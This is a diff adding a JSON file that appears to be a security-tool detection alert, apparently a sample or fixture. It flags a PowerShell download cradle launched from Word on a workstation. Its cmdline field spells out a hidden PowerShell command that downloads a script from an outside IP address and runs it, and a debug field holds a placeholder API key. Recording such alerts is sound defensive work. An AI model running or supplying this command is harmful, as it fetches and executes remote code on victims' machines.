@@ -1,0 +1,17 @@
+{
+  "detection_id": "ldt:4f2a9c1e7b:81604559",
+  "name": "Suspicious PowerShell Download Cradle",
+  "severity": "High",
+  "device": { "hostname": "FIN-WS-0231", "platform_name": "Windows", "local_ip": "10.20.4.31" },
+  "user_name": "jdoe",
+  "behaviors": [
+    {
+      "tactic": "Execution",
+      "technique_id": "T1059.001",
+      "cmdline": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/a.ps1')",
+      "parent_process": "WINWORD.EXE",
+      "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
+    }
+  ],
+  "debug": "api_key=sk-live-should-be-redacted"
+}
